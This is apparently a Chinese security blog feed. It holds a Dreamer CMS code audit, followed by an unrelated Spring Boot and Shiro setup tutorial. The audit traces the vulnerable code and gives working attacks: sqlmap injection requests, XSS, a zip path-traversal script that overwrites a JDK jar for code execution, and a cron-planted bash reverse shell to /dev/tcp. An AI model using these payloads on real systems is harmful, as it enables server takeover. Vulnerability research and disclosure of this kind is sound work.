<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /admin/search/doSearch HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Referer: http://127.0.0.1:8888/admin/search//doSearch</span><br><span class="line">Cookie: dreamer-cms-s=d88b060d-b171-4dd7-8edb-f23c2a804bad</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Origin: http://127.0.0.1:8888</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">entity%5B%27typeid%27%5D=*</span><br></pre></td></tr></table></figure>

<p>保存文件、sqlmap一把梭：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test.txt -level=5</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/01/65bbacdc12b3b.png"  alt="image-20240201223818762"></p>
<h3 id="前台首页搜索处存在SQL注入"><a href="#前台首页搜索处存在SQL注入" class="headerlink" title="前台首页搜索处存在SQL注入"></a>前台首页搜索处存在SQL注入</h3><p>刚刚我们分析过后还有一处也调用了<code>queryListByKeywords</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3a247e85f.png"  alt="image-20240203025323191"></p>
<p>位置在<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\taglib\tags\PageListTag.java</code></p>
<p>删了一些没有关系的，留了点比较重要的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public String parse(String html, SearchEntity params) </span><br><span class="line"></span><br><span class="line">	Map&lt;String,Object&gt; searchParams = new HashMap&lt;String,Object&gt;();</span><br><span class="line">	</span><br><span class="line">	String keywords = params.getEntity().get(&quot;keywords&quot;).toString();</span><br><span class="line">	searchParams.put(&quot;keywords&quot;, keywords);</span><br><span class="line">	</span><br><span class="line">	if(params.getEntity().containsKey(&quot;typeid&quot;) &amp;&amp; StringUtil.isNotBlank(params.getEntity().get(&quot;typeid&quot;))) &#123;</span><br><span class="line">		String typeid = params.getEntity().get(&quot;typeid&quot;).toString();</span><br><span class="line">		typeid = typeid.replace(&quot;,&quot;, &quot;&#x27;,&#x27;&quot;);</span><br><span class="line">		searchParams.put(&quot;typeid&quot;, &quot;&#x27;&quot; + typeid + &quot;&#x27;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	for (int i = 0;i &lt; listTags.size();i++) &#123;</span><br><span class="line">		</span><br><span class="line">		List&lt;ArchivesVo&gt; list = archivesMapper.queryListByKeywords(searchParams);</span><br><span class="line">		</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>可以看到先创建了一个<code>searchParams</code>的集合，之后就是把<code>typeid</code>参数放进这个集合没有任何过滤。</p>
<p>接着就是继续寻找<code>parse</code>方法的调用处，看看在这之前有没有做啥过滤。同样是在当前路径下的<code>parsePageList</code>方法</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3d11275c7.png"  alt="image-20240203030552036"></p>
<p>可以看到也是没有做任何过滤</p>
<p>那就继续向上寻找，最终是定位到<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\controller\FrontController.java</code></p>
<p>在<code>/search</code>下接受的<code>params</code>实体类，那就看他中有没有对<code>typeid</code>参数过滤</p>
<p>对<code>typeid</code>参数没有处理，但是这块做了一些限制。若不满足，就会终止：</p>
<ul>
<li>必须包含entity[‘keywords’]、pageNum、pageSize这三个参数（pageNum、pageSize参数有给默认值，我们发请求不携带也OK）</li>
<li>keywords不能少于5个字符</li>
</ul>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3f0354934.png"  alt="image-20240203031410200"></p>
<p>所以我们满足这两个条件即可！</p>
<p>我们在页面中找到该接口在前台搜索处</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd3f8bbf988.png"  alt="image-20240203031626423"></p>
<p>抓包、添加entity[‘typeid’]参数，并且保证keywords长度大于5.</p>
<p>保存数据包sqlmap一把梭</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r D:\Desktop\test2.txt -level=5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /search HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">sec-ch-ua: &quot;Not_A Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;120&quot;, &quot;Google Chrome&quot;;v=&quot;120&quot;</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Origin: http://127.0.0.1:8888</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Referer: http://127.0.0.1:8888/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cookie: dreamer-cms-s=3b69bad5-b1b3-4d47-b2b4-2938b036f7c5</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">entity%5B%27keywords%27%5D=qwert&amp;entity%5B%27typeid%27%5D=*</span><br></pre></td></tr></table></figure>

<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd402385dbe.png"  alt="image-20240203031858196"></p>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="前台首页储存型XSS"><a href="#前台首页储存型XSS" class="headerlink" title="前台首页储存型XSS"></a>前台首页储存型XSS</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc88f98c7cb.png"  alt="image-20240202141728147"></p>
<p>前台刷新页面触发</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc891c0fca3.png"  alt="image-20240202141803303"></p>
<p>数据包</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc897079d42.png"  alt="image-20240202141927606"></p>
<p>定位到<code>dreamer_cms_4.0.1\src\main\java\cn\itechyou\cms\controller\admin\CategoryController.java</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/02/65bc89ad57080.png"  alt="image-20240202142028468"></p>
<p>没有做任何过滤就存到数据库中</p>
<h3 id="后台附件管理文件任意文件上传导致xss"><a href="#后台附件管理文件任意文件上传导致xss" class="headerlink" title="后台附件管理文件任意文件上传导致xss"></a>后台附件管理文件任意文件上传导致xss</h3><p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd4331cc1f2.png"  alt="image-20240203033200809"></p>
<p>抓包，可以看到文件路径</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd4373ae8e3.png"  alt="image-20240203033306512"></p>
<p>然后访问即可，有点鸡肋</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/03/65bd43ae945bd.png"  alt="image-20240203033405681"></p>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p><a class="link"   href="https://n1k0la-t.github.io/2023/01/31/DreamerCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >https://n1k0la-t.github.io/2023/01/31/DreamerCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p><em>cc&#x2F;iteachyou&#x2F;cms&#x2F;controller&#x2F;admin&#x2F;TaskController.java#runTaskCron</em>调用了*Class.forName()*，参数可控。</p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201151939509.png"  alt="image-20230201151939509"></p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201015554062.png"  alt="image-20230201015554062"></p>
<p>由于Java的懒加载，我们可以通过覆盖JDK安装路径下未被打开的jar包，在没有被加载的类的静态代码块中写入恶意代码，再利用此处的*Class.forName()*加载类，执行类中的静态代码。但是由此引发了一个问题，如何获取JDK安装路径？实际上，DreamerCMS的后台仪表盘已经为我们提供了JDK安装路径。</p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201021319148.png"  alt="image-20230201021319148"></p>
<p>需要注意的是，在一些较低的JDK版本中，并不存在懒加载。</p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201023217750.png"  alt="image-20230201023217750"></p>
<p>8u181</p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201112353963.png"  alt="image-20230201112353963"></p>
<p>8u212</p>
<p>这里选择覆盖没有被打开的*&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;jre&#x2F;lib&#x2F;ext&#x2F;zipfs.jar*，制作一个同名jar包。</p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201121012985.png"  alt="image-20230201121012985"></p>
<p>制作恶意压缩文件，覆盖*&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;jre&#x2F;lib&#x2F;ext&#x2F;zipfs.jar*。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import zipfile</span><br><span class="line"></span><br><span class="line">zipFile = zipfile.ZipFile(&#x27;t.zip&#x27;, &#x27;a&#x27;, zipfile.ZIP_DEFLATED)</span><br><span class="line">zipFile.write(&#x27;zipfs.jar&#x27;, &#x27;../../../../../../../../../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/zipfs.jar&#x27;, zipfile.ZIP_DEFLATED)</span><br><span class="line">zipFile.close()</span><br></pre></td></tr></table></figure>

<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201121831418.png"  alt="image-20230201121831418"></p>
<p>最后添加计划任务并执行，通过任意文件读取漏洞读取命令执行结果。</p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201122618359.png"  alt="image-20230201122618359"></p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201122957570.png"  alt="image-20230201122957570"></p>
<p><img   src="https://webdxg.oss-cn-nanjing.aliyuncs.com/image-20230201122922584.png"  alt="image-20230201122922584"></p>
<p><a class="link"   href="https://forum.butian.net/share/2183" >奇安信攻防社区-Dreamer CMS 代码审计 (butian.net)<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="后台压缩校验不正确导致Getshell"><a href="#后台压缩校验不正确导致Getshell" class="headerlink" title="后台压缩校验不正确导致Getshell"></a>后台压缩校验不正确导致Getshell</h3><p>漏洞效果</p>
<p>我们先在 Linux 系统创建<code>..\*..\*..\*..\*..\*..\*..\*..\*..\*..\*var\*spool\*cron\*root</code>文件，并写入远连命令。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/7777 0&amp;gt;&amp;amp;1&quot;</span> &amp;gt; ..\*..\*..\*..\*..\*..\*..\*..\*..\*..\*<span class="keyword">var</span>\*spool\*cron\*root</span><br><span class="line">zip -r ./test3.zip ..\*..\*..\*..\*..\*..\*..\*..\*..\*..\*<span class="keyword">var</span>\*spool\*cron\*root</span><br></pre></td></tr></table></figure>

<p><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a6b9d22b26328456606820c3f33d34b17d6f496d.png"  alt="8.png"><br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-a1d9bdfd8c27e95ff6b7664bc53e9703c632ee23.png"  alt="image.png"><br>打包完后，通过风格管理上传该压缩包。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-107a16a037c005783006e03aeb0b148db5b5d99f.png"  alt="image.png"><br>提示主题描述不存在，问题不大，这说明解压完成了。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-5bbedcd2d814e04f880e292e3aa57bb73e1c8fca.png"  alt="image.png"><br>在后台日志输出也能看到解压完毕。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-2415ecdb6325dd4a0eada20009d0f880e18defd7.png"  alt="image.png"><br>接着我们到服务机器上看到我们的文件已经写进去了。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-4323ae5bea3f4f9ce02a0bcc6005f37bddaeea92.png"  alt="image.png"><br>通过<code>nc -lvvp 7777</code>成功获得服务器权限。<br><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-3356fdbb6d7614503f610ffa271cad5060e5bb87.png"  alt="image.png"></p>
<p>漏洞定位</p>
<p>Controller文件：<code>src/main/java/cc/iteachyou/cms/controller/admin/ThemesController.java</code></p>
<p><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-e1512a35a58f3da4bca4d8916680f1c9b11065aa.png"  alt="image.png"><br>在添加主题中调用了<code>unZipFiles</code>，我们具体看看这个工具类方法。<br>工具类文件：<code>src/main/java/cc/iteachyou/cms/utils/ZipUtils.java</code></p>
<p><img   src="https://shs3.b.qianxin.com/attack_forum/2023/03/attach-1c5f367b0298781531205521ec8a7e540e46365b.png"  alt="image.png"><br>代码是常见的文件解压操作，针对压缩包内文件名做了<code>../</code>判断的校验，但在后面的代码里，使用正则将文件名内的<code>*</code>全部替换成路径符号<code>/</code>。值得注意的是，这里没有校验<code>..\</code>，这同样会造成目录穿越。<br><code>..*..*..*..*..*..*..*..*..*..*var\*spool\*cron\*root</code>变成<code>../../../../../../../../../../var/spool/cron/root</code>导致目录穿越的产生。在Linux情况下，我们可以写计划任务或者写SSH私钥可以达到获取服务器权限的目的。Window的情况下可以写恶意EXE到桌面钓鱼。</p>
]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot集成shiro</title>
    <url>/blog/2024/02/06/240206springboot%E9%9B%86%E6%88%90shiro/</url>
    <content><![CDATA[<hr>
<h2 id="0x01-shiro环境搭建"><a href="#0x01-shiro环境搭建" class="headerlink" title="0x01 shiro环境搭建"></a>0x01 shiro环境搭建</h2><p>以下是在Spring Boot中整合Shiro的基本应用示例，帮助我们掌握Shiro的基本使用</p>
<ul>
<li>springboot：2.2.1.RELEASE</li>
<li>java：1.8.0_144</li>
<li>mysql：5.7.21</li>
</ul>
<h3 id="01、创建springboot项目"><a href="#01、创建springboot项目" class="headerlink" title="01、创建springboot项目"></a>01、创建springboot项目</h3><p>1）创建旧版本的 Spring Boot 项目。</p>
<p>关于创建任意 Spring Boot 和 Java 版本的 Spring Boot 项目，以 Maven 项目为例，只需要在创建好的springboot项目修改 <code>pom.xml</code> 中的 2 个配置元素即可：</p>
<ul>
<li><code>&lt;version&gt;2.2.1.RELEASE&lt;/version&gt;</code> 指定 Spring Boot 的版本号 </li>
<li><code>&lt;java.version&gt;1.8&lt;/java.version&gt;</code> 指定 Java 的版本号</li>
</ul>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c13ada6b5ee.png"  alt="image-20240206034528767"></p>
<p>2）创建springboot项目这个比较简单、就不多说了。然后导入<code>thymeleaf</code>模版依赖。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--thymeleaf--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>2）新建一个首页， 在<code>src\main\resources\templates</code>路径下</p>
<blockquote>
<p>我们要使用thymeleaf，需要在html文件中导入命名空间的约束，方便提示。</p>
<p><code>xmlns:th=&quot;http://www.thymeleaf.org&quot;</code></p>
</blockquote>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c13ee5e6810.png"  alt="image-20240206040244771"></p>
<p>3）为首页编写一个<code>Controller</code></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c13e971c4b7.png"  alt="image-20240206040125938"></p>
<p>4）启动，测试。访问到如下页面就是成功了！</p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c13f4eceaaa.png"  alt="image-20240206040429833"></p>
<h3 id="02、导入基本的依赖"><a href="#02、导入基本的依赖" class="headerlink" title="02、导入基本的依赖"></a>02、导入基本的依赖</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--shiro--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;1.4.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="03、编写shiro配置文件骨架"><a href="#03、编写shiro配置文件骨架" class="headerlink" title="03、编写shiro配置文件骨架"></a>03、编写shiro配置文件骨架</h3><p>先创建好基本骨架、再添加内容！</p>
<p><strong>shiro三大核心对象，咱们从后往前依次创建</strong></p>
<ul>
<li>ShiroFilterFactoryBean</li>
<li>DefaultWebSecurityManager</li>
<li>自定义Realm对象</li>
</ul>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c15367560c3.png"  alt="image-20240206053013955"> </p>
<p>1）Realm 可以理解为 Shiro 与后端数据源进行交互的桥梁</p>
<ul>
<li>负责从数据源（例如数据库、LDAP、文件系统等）中获取用户身份信息和权限信息，然后将这些信息提供给 Shiro 进行认证和授权操作。</li>
<li>自定义 Realm 类需要继承 <code>AuthorizingRealm</code> 类，并实现其中的 <code>doGetAuthenticationInfo</code> 和 <code>doGetAuthorizationInfo</code> 方法来完成认证和授权逻辑。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.shiro.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationException;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.AuthenticationToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.AuthorizationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.AuthorizingRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.PrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserRealm</span> <span class="keyword">extends</span> <span class="title class_">AuthorizingRealm</span> &#123;</span><br><span class="line">    <span class="comment">//授权</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthorizationInfo <span class="title function_">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了 -&gt; 授权 doGetAuthorizationInfo&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//认证</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken authenticationToken)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了 -&gt; 认证 doGetAuthenticationInfo&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2）DefaultWebSecurityManager是 Apache Shiro 框架中的一个关键组件，它实现了 SecurityManager 接口，并且特别适用于 Web 应用程序的安全管理。</p>
<p>DefaultWebSecurityManager 负责协调 Shiro 的各个组件，包括 Realm、SessionManager、CacheManager 等，以提供全面的安全功能。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *安全管理器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Bean(&quot;securityManager&quot;)</span></span><br><span class="line"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">defaultWebSecurityManager</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//创建了一个 DefaultWebSecurityManager 对象 securityManager</span></span><br><span class="line">    <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();</span><br><span class="line">    <span class="comment">//关联userRealm</span></span><br><span class="line">    securityManager.setRealm(userRealm);</span><br><span class="line">    <span class="keyword">return</span> securityManager;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）ShiroFilterFactoryBean</p>
<p>整合 Shiro 到 Spring 应用程序中时，通常会使用 <code>ShiroFilterFactoryBean</code> 来配置 Shiro 的过滤器链，以定义 URL 拦截的规则和权限控制策略。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义角色过滤器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Bean(&quot;shirFilter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">shirFilter</span><span class="params">(SecurityManager securityManager)</span> &#123;</span><br><span class="line">    <span class="comment">//创建了一个 ShiroFilterFactoryBean 对象</span></span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">    <span class="comment">//设置安全管理器</span></span><br><span class="line">    shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line">    <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>完整配置文件：</strong></p>
<p><img   src="https://raw.githubusercontent.com/wsYu9a/Images/image/uploads/2024/02/06/65c1600bdf67f.png"  alt="image-20240206062410520"></p>
<h3 id="04、实现登录拦截"><a href="#04、实现登录拦截" class="headerlink" title="04、实现登录拦截"></a>04、实现登录拦截</h3><p>1）需求：login页都可访问、index也需登录才能访问</p>
<p>首先新建登录页，并编写接口</p>
<p>controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/login&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toLogin</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>login.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">&quot;text-center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/login&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">th:name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">th:name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>=<span class="string">&quot;required&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span>Sign in<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2）实现</p>
<p>通过在shiro配置文件中配置ShiroFilterFactoryBean实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Bean(&quot;shirFilter&quot;)</span><br><span class="line">public ShiroFilterFactoryBean shirFilter(SecurityManager securityManager) &#123;</span><br><span class="line">    //创建了一个 ShiroFilterFactoryBean 对象</span><br><span class="line">    ShiroFilterFactoryBean shiroFilterFactoryBean = new ShiroFilterFactoryBean();</span><br><span class="line">    //设置安全管理器</span><br><span class="line">    shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line">    //未经身份验证时，将重定向到 /login 这个URL,如果不设置默认会自动寻找Web工程根目录下的&quot;/login.jsp&quot;页面</span><br><span class="line">    shiroFilterFactoryBean.setLoginUrl(&quot;/login&quot;);</span><br><span class="line">    //添加shiro内置过滤器</span><br><span class="line">    /*</span><br><span class="line">       anon 无需认证可访问</span><br><span class="line">       authc 必须认证才能访问</span><br><span class="line">       user  需有rememberMe功能才可使用</span><br><span class="line">       permes 有对应权限可访问</span><br><span class="line">       role  有对应角色才可访问</span><br><span class="line">     */</span><br><span class="line">    LinkedHashMap&lt;String,String&gt; fc = new LinkedHashMap&lt;&gt;();</span><br><span class="line">    fc.put(&quot;/**&quot;, &quot;authc&quot;);</span><br><span class="line">    fc.put(&quot;/login&quot;, &quot;anon&quot;);</span><br><span class="line">    shiroFilterFactoryBean.setFilterChainDefinitionMap(fc);</span><br><span class="line">    return shiroFilterFactoryBean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>3）测试：访问首页，直接跳转到登录页！</p>
